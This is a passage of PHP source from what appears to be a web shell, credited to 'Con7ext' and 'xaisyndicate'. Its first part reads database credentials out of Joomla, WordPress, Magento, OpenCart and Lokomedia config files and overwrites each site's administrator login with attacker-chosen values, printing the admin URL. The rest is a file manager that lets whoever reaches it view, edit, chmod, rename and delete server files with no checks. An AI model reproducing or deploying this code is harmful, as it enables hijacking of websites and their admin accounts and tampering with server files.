          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/WordPress/",$config)) {
        $dbhost = ambilkata($config,"DB_HOST', '","'");
        $dbuser = ambilkata($config,"DB_USER', '","'");
        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"DB_NAME', '","'");
        $dbprefix = ambilkata($config,"table_prefix  = '","'");
        $prefix = $dbprefix."users";
        $option = $dbprefix."options";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[ID];
        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[option_value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE id='$id'");
        echo "CMS: Wordpress<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/Magento|Mage_Core/",$config)) {
        $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
        $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
        $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
        $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
        $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
        $prefix = $dbprefix."admin_user";
        $option = $dbprefix."core_config_data";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "CMS: Magento<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
        $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
        $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
        $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"'DB_DATABASE', '","'");
        $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
        $prefix = $dbprefix."user";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $target = ambilkata($config,"HTTP_SERVER', '","'");
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "CMS: OpenCart<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
        $dbhost = ambilkata($config,'server = "','"');
        $dbuser = ambilkata($config,'username = "','"');
        $dbpass = ambilkata($config,'password = "','"');
        $dbname = ambilkata($config,'database = "','"');
        $prefix = "users";
        $option = "identitas";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
        $result = mysql_fetch_array($q);
        $target = $result[alamat_website];
        if($target == '') {
          $target2 = $result[url];
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          if($target2 == '') {
            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $cek_login3 = file_get_contents("$target2/adminweb/");
            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
              $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
              $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
            } else {
              $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
            }
          }
        } else {
          $cek_login = file_get_contents("$target/adminweb/");
          $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
          if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
          } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
          } else {
            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
          }
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE level='admin'");
        echo "CMS: Lokomedia<br>";
        if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
          echo $url_target2;
        } else {
          echo $url_target;
        }
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      }
    }
  }     
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
elseif(isset($_GET['filesrc'])){
	echo "<tr><td>";
	echo '</tr></td></table><br />';
	echo "<textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea><br />";
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Success</font><br/>';
}else{
echo '<font color="red">Denied</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div><table width="700" class="content" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Permission</center></th>
<th><center>Action</center></th>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<br><br><hr color="#191919"><br><center>Copyright &copy '.date("Y").' <a href="https://www.facebook.com/jembud.go.id" target="_blank">Con7ext</a> - <a href="https://www.facebook.com/xaisyndicate" target="_blank">'.$_COPY.'</a></center>
</body>
</html>';
?>